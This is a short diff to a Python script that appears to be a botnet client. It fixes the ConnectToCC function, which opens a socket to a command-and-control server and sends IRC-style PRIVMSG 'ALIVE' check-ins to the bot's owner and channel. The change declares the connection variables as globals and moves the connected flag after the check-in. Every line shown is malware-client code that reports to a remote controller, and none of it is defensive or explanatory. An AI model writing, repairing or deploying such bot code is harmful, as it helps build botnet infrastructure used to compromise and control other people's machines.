@@ -26,6 +26,9 @@ C1_LISTEN = True
 
 def ConnectToCC():
     """Handle Connection to C&C Server."""
+    global CC_CONNECTED
+    global CC_SOCK
+
     print("**** Connecting to: " + CC_HOST + ":" + str(CC_PORT) + " ****")
     CC_SOCK.connect((CC_HOST, CC_PORT))
     time.sleep(3)
@@ -39,8 +42,8 @@ def ConnectToCC():
     time.sleep(3)
     CC_SOCK.send("PRIVMSG " + CC_OWNR + " " + CC_NAME + " ALIVE\n")
     CC_SOCK.send("PRIVMSG " + CC_CHAN + " " + CC_NAME + " ALIVE\n")
-    CC_CONNECTED = True
     print("DONE\n")
+    CC_CONNECTED = True
 
 
 def ConnectToC1():
